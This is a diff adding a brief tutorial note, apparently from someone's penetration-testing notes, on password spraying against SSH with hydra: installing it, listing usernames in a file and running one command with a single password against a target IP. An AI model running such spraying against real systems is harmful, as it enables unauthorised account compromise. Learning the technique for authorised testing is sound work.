@@ -1,0 +1,17 @@
+Password spraying is usefull when you have a list of use and one password to try for all these accounts. Typically a default password.
+We can use hydra for this purpose.
+
+To install hydra;
+sudo apt-get install hydra
+
+To use it:
+You need a file containing the list of user you want to try all on a different line. A list as such:
+```
+albert
+Joan
+dhaya
+optimusprimethegigachad
+```
+
+Then type this command to run the password spray:
+hydra -L usernames.txt -p '<password_to_try>' <ip> ssh
